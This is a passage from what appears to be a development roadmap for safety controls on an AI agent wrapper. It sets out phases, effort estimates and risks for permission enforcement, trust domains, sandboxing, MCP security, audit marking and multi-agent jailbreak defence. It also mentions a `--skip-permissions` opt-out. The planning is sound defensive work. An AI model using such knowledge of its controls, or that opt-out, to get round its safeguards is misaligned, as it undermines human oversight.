Phase 5 (MCP)          Phase 6 (Audit)             17.10, 17.11
  17.13 ─┐               17.16 ─┐                  17.12
  17.14 ─┤               17.17 ─┤                    |
  17.15 ─┘               17.18 ─┤                    v
                          17.19 ─┘              Phase 7 (Multi-Agent)
                            |                     17.20, 17.21
                            v                     17.22, 17.23
                       Phase 8 (Tool Sandbox)        |
                         17.24, 17.25                v
                         17.26                  Phase 9 (Advanced)
                            |                   17.27-17.30
                            v
                         Complete
```

**Parallelizable**: Phases 1-3 can run concurrently with Phases 5-6.
Phase 4 depends on Phase 1 (contracts must be enforced before sandbox matters).
Phase 7 depends on Phase 2 (trust domains define the sanitization boundaries).

## Effort Estimates

| Phase | Tasks | Effort | Priority |
|---|---|---|---|
| 1: Contract Enforcement | 17.1-17.4 | 3-4 days | **Critical** -- currently running permissive |
| 2: Trust Domains | 17.5-17.7 | 3-4 days | High -- CaMeL is proven architecture |
| 3: Graduated Trust | 17.8-17.9 | 2-3 days | High -- UX for permission fatigue |
| 4: Sandbox | 17.10-17.12 | 3-4 days | High -- defense in depth |
| 5: MCP Security | 17.13-17.15 | 3-4 days | High -- 36.7% of MCP servers vulnerable |
| 6: Audit & Compliance | 17.16-17.19 | 4-5 days | **Critical** -- Article 50 deadline Aug 2026 |
| 7: Multi-Agent | 17.20-17.23 | 3-4 days | Medium -- infectious jailbreak is real |
| 8: Tool Sandbox | 17.24-17.26 | 2-3 days | Medium -- defense in depth |
| 9: Advanced | 17.27-17.30 | 3-4 days | Medium -- observability and validation |

**Total**: 26-35 days across 30 tasks

## Risk Factors

1. **Performance overhead**: Every safety check adds latency. Budget 50ms total
   for the full safety chain per tool call. Profile early, optimize hot paths.

2. **False positives**: Overly aggressive sanitization will break legitimate agent
   behavior. Start with high-confidence patterns only, expand based on data.

3. **Claude CLI limitations**: Some safety enforcement (tool allowlists, path
   restrictions) depends on Claude CLI supporting the relevant flags. If the CLI
   doesn't expose fine-grained control, enforcement must be at the wrapper level.

4. **Article 50 standards gap**: No harmonized standards published in OJEU yet.
   Implementation follows the Code of Practice mandate for multi-layered marking.
   Expect to iterate as standards are published.

5. **Backward compatibility**: Existing plans and workflows that rely on
   `dangerously_skip_permissions` will break. Migration path: warn for one release,
   then enforce. `--skip-permissions` is the explicit opt-out.
